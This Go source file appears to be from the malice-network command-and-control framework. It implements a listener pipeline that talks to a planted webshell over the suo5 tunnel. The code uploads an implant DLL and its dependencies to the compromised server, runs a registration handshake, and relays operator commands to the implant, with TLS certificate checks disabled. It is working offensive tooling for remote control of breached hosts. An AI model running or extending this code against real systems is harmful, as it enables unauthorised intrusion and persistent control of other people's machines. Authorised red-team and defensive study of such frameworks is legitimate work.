package listener

import (
	"bytes"
	"crypto/tls"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/chainreactors/IoM-go/consts"
	"github.com/chainreactors/IoM-go/proto/client/clientpb"
	"github.com/chainreactors/IoM-go/proto/implant/implantpb"
	"github.com/chainreactors/IoM-go/types"
	"github.com/chainreactors/logs"
	"github.com/chainreactors/malice-network/helper/encoders/hash"
	"github.com/chainreactors/malice-network/server/internal/core"
	"github.com/chainreactors/malice-network/server/internal/parser"
	"github.com/chainreactors/proxyclient/suo5"
	"google.golang.org/protobuf/proto"
)

// Bootstrap stage names for HTTP query string (?s=<stage>).
const (
	wsStageLoad   = "load"
	wsStageStatus = "status"
	wsStageInit   = "init"
	wsStageDeps   = "deps"
)

// webshellParams is the JSON stored in CustomPipeline.Params.
type webshellParams struct {
	Suo5URL    string `json:"suo5_url"`
	StageToken string `json:"stage_token,omitempty"`
	DLLPath    string `json:"dll_path,omitempty"`
	DepsDir    string `json:"deps_dir,omitempty"`
}

func NewWebShellPipeline(rpc bindRPCClient, pipeline *clientpb.Pipeline) (*WebShellPipeline, error) {
	custom := pipeline.GetCustom()
	if custom == nil {
		return nil, fmt.Errorf("webshell pipeline missing custom body")
	}

	var params webshellParams
	if custom.Params != "" {
		if err := json.Unmarshal([]byte(custom.Params), &params); err != nil {
			return nil, fmt.Errorf("parse webshell params: %w", err)
		}
	}
	if params.Suo5URL == "" && custom.Host != "" {
		params.Suo5URL = custom.Host
	}
	if params.Suo5URL == "" {
		return nil, fmt.Errorf("webshell pipeline requires suo5_url")
	}

	msgParser, err := parser.NewParser(consts.ImplantMalefic)
	if err != nil {
		return nil, fmt.Errorf("create malefic parser: %w", err)
	}

	return &WebShellPipeline{
		rpc:        rpc,
		Name:       pipeline.Name,
		ListenerID: pipeline.ListenerId,
		Enable:     pipeline.Enable,
		Suo5URL:    params.Suo5URL,
		DLLPath:    params.DLLPath,
		DepsDir:    params.DepsDir,
		parser:     msgParser,
		httpClient: &http.Client{
			Timeout: 30 * time.Second,
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			},
		},
		pipeline: pipeline,
	}, nil
}

type WebShellPipeline struct {
	rpc        bindRPCClient
	Name       string
	ListenerID string
	Enable     bool
	Suo5URL    string
	DLLPath    string
	DepsDir    string

	parser     *parser.MessageParser
	httpClient *http.Client
	sessions   sync.Map // rawID(uint32) → *webshellSession
	pipeline   *clientpb.Pipeline
}

type webshellSession struct {
	conn  net.Conn
	rawID uint32
	mu    sync.Mutex
}

func (p *WebShellPipeline) ID() string { return p.Name }

func (p *WebShellPipeline) ToProtobuf() *clientpb.Pipeline { return p.pipeline }

func (p *WebShellPipeline) Start() error {
	p.Enable = true
	forward, err := core.NewForward(p.rpc, p)
	if err != nil {
		return err
	}
	forward.ListenerId = p.ListenerID
	core.Forwarders.Add(forward)

	logs.Log.Infof("[pipeline] starting WebShell pipeline %s -> %s", p.Name, p.Suo5URL)
	core.GoGuarded("webshell-handler:"+p.Name, p.handler, p.runtimeErrorHandler("handler loop"))
	return nil
}

func (p *WebShellPipeline) Close() error {
	p.Enable = false
	p.sessions.Range(func(key, value interface{}) bool {
		sess := value.(*webshellSession)
		sess.conn.Close()
		p.sessions.Delete(key)
		return true
	})
	return nil
}

// handler is the main loop receiving SpiteRequests from the server via Forward.
func (p *WebShellPipeline) handler() error {
	defer logs.Log.Debugf("webshell pipeline %s handler exit", p.Name)
	for {
		forward := core.Forwarders.Get(p.ID())
		if forward == nil {
			return fmt.Errorf("webshell pipeline %s forwarder missing", p.Name)
		}
		msg, err := forward.Stream.Recv()
		if err != nil {
			return fmt.Errorf("webshell pipeline %s recv: %w", p.Name, err)
		}
		core.GoGuarded("webshell-request:"+p.Name, func() error {
			return p.handlerReq(msg)
		}, core.LogGuardedError("webshell-request:"+p.Name))
	}
}

// handlerReq dispatches a single SpiteRequest. ModuleInit triggers DLL bootstrap
// and suo5 channel setup; everything else is forwarded to the session conn.
func (p *WebShellPipeline) handlerReq(req *clientpb.SpiteRequest) error {
	rawID := req.Session.RawId

	if req.Spite.Name == consts.ModuleInit {
		return p.initSession(rawID)
	}

	val, ok := p.sessions.Load(rawID)
	if !ok {
		return fmt.Errorf("session %d not found", rawID)
	}
	sess := val.(*webshellSession)

	spites := &implantpb.Spites{Spites: []*implantpb.Spite{req.Spite}}
	sess.mu.Lock()
	err := p.parser.WritePacket(sess.conn, spites, sess.rawID)
	sess.mu.Unlock()
	return err
}

// initSession bootstraps DLL, dials suo5, registers session, starts readLoop.
func (p *WebShellPipeline) initSession(rawID uint32) error {
	if p.DepsDir != "" {
		if err := p.deliverDeps(); err != nil {
			logs.Log.Warnf("deliver deps: %v", err)
		}
	}

	reg, sid, err := p.bootstrapDLL()
	if err != nil {
		return fmt.Errorf("bootstrap DLL: %w", err)
	}

	conn, err := p.dialSuo5()
	if err != nil {
		return fmt.Errorf("dial suo5: %w", err)
	}

	sess := &webshellSession{conn: conn, rawID: sid}
	p.sessions.Store(sid, sess)

	regSpite, _ := types.BuildSpite(&implantpb.Spite{
		Name: types.MsgRegister.String(),
	}, reg)

	sessionID := hash.Md5Hash([]byte(fmt.Sprintf("%d", sid)))
	core.Forwarders.Send(p.ID(), &core.Message{
		Spites:    &implantpb.Spites{Spites: []*implantpb.Spite{regSpite}},
		SessionID: sessionID,
		RawID:     sid,
	})

	core.GoGuarded(
		fmt.Sprintf("webshell-readloop:%s:%d", p.Name, sid),
		func() error { return p.readLoop(sess, sessionID) },
		core.LogGuardedError(fmt.Sprintf("webshell-readloop:%s:%d", p.Name, sid)),
	)

	logs.Log.Importantf("[webshell] session %d registered via %s", sid, p.Suo5URL)
	return nil
}

// readLoop reads TLV frames from suo5 conn and forwards to server.
func (p *WebShellPipeline) readLoop(sess *webshellSession, sessionID string) error {
	defer func() {
		sess.conn.Close()
		p.sessions.Delete(sess.rawID)
		logs.Log.Debugf("[webshell] readLoop exit for session %d", sess.rawID)
	}()
	for {
		_, spites, err := p.parser.ReadPacket(sess.conn)
		if err != nil {
			return fmt.Errorf("session %d read: %w", sess.rawID, err)
		}
		core.Forwarders.Send(p.ID(), &core.Message{
			Spites:    spites,
			SessionID: sessionID,
			RawID:     sess.rawID,
		})
	}
}

// bootstrapDLL performs status check, DLL load if needed, and init handshake.
func (p *WebShellPipeline) bootstrapDLL() (*implantpb.Register, uint32, error) {
	statusBody, err := p.bootstrapHTTP(wsStageStatus, nil)
	if err != nil {
		return nil, 0, fmt.Errorf("status check: %w", err)
	}

	ready := false
	text := strings.TrimSpace(string(statusBody))
	if len(text) > 0 && text[0] == '{' {
		var sr struct{ Ready bool }
		if json.Unmarshal([]byte(text), &sr) == nil {
			ready = sr.Ready
		}
	} else if text == "LOADED" {
		ready = true
	}

	if !ready && p.DLLPath != "" {
		dllBytes, err := os.ReadFile(p.DLLPath)
		if err != nil {
			return nil, 0, fmt.Errorf("read DLL %s: %w", p.DLLPath, err)
		}
		if _, err = p.bootstrapHTTP(wsStageLoad, dllBytes); err != nil {
			return nil, 0, fmt.Errorf("load DLL: %w", err)
		}
		logs.Log.Infof("[webshell] DLL loaded to %s", suo5ToHTTPURL(p.Suo5URL))
	} else if !ready {
		return nil, 0, fmt.Errorf("DLL not loaded and no --dll path provided")
	}

	body, err := p.bootstrapHTTP(wsStageInit, nil)
	if err != nil {
		return nil, 0, fmt.Errorf("init: %w", err)
	}
	if len(body) < 4 {
		return nil, 0, fmt.Errorf("init response too short: %d bytes", len(body))
	}

	sid := binary.LittleEndian.Uint32(body[:4])
	reg := &implantpb.Register{}
	if err := proto.Unmarshal(body[4:], reg); err != nil {
		return nil, 0, fmt.Errorf("unmarshal register: %w", err)
	}
	return reg, sid, nil
}

func (p *WebShellPipeline) deliverDeps() error {
	entries, err := os.ReadDir(p.DepsDir)
	if err != nil {
		return err
	}

	for _, entry := range entries {
		if entry.IsDir() {
			continue
		}
		data, err := os.ReadFile(filepath.Join(p.DepsDir, entry.Name()))
		if err != nil {
			return fmt.Errorf("read dep %s: %w", entry.Name(), err)
		}
		depName := entry.Name()
		reqURL := fmt.Sprintf("%s?s=%s&name=%s", suo5ToHTTPURL(p.Suo5URL), wsStageDeps, url.QueryEscape(depName))
		req, err := http.NewRequest("POST", reqURL, bytes.NewReader(data))
		if err != nil {
			return fmt.Errorf("create dep request %s: %w", depName, err)
		}
		req.Header.Set("Content-Type", "application/octet-stream")
		resp, err := p.httpClient.Do(req)
		if err != nil {
			return fmt.Errorf("deliver dep %s: %w", depName, err)
		}
		resp.Body.Close()
		if resp.StatusCode != http.StatusOK {
			return fmt.Errorf("deliver dep %s: HTTP %d", depName, resp.StatusCode)
		}
		logs.Log.Debugf("[webshell] dep delivered: %s", depName)
	}
	return nil
}

// bootstrapHTTP sends a simple HTTP POST with stage in query string.
// ?s=status / ?s=load / ?s=init
func (p *WebShellPipeline) bootstrapHTTP(stage string, payload []byte) ([]byte, error) {
	reqURL := fmt.Sprintf("%s?s=%s", suo5ToHTTPURL(p.Suo5URL), stage)

	var bodyReader io.Reader
	if payload != nil {
		bodyReader = bytes.NewReader(payload)
	}
	req, err := http.NewRequest("POST", reqURL, bodyReader)
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/octet-stream")

	resp, err := p.httpClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("HTTP %d: %s", resp.StatusCode, string(body))
	}
	return body, nil
}

func (p *WebShellPipeline) dialSuo5() (net.Conn, error) {
	u, err := url.Parse(p.Suo5URL)
	if err != nil {
		return nil, fmt.Errorf("parse suo5 url: %w", err)
	}
	conf, err := suo5.NewConfFromURL(u)
	if err != nil {
		return nil, fmt.Errorf("suo5 config: %w", err)
	}
	client := &suo5.Suo5Client{Proxy: u, Conf: conf}
	conn, err := client.Dial("tcp", "bridge:0")
	if err != nil {
		return nil, fmt.Errorf("suo5 dial: %w", err)
	}
	return conn, nil
}

func (p *WebShellPipeline) runtimeErrorHandler(scope string) core.GoErrorHandler {
	return core.PipelineRuntimeErrorHandler("webshell", p.Name+" "+scope, p.ListenerID, func() { p.Enable = false }, nil)
}

// --- Helpers ---

func suo5ToHTTPURL(suo5URL string) string {
	s := strings.TrimSpace(suo5URL)
	s = strings.Replace(s, "suo5s://", "https://", 1)
	s = strings.Replace(s, "suo5://", "http://", 1)
	return s
}

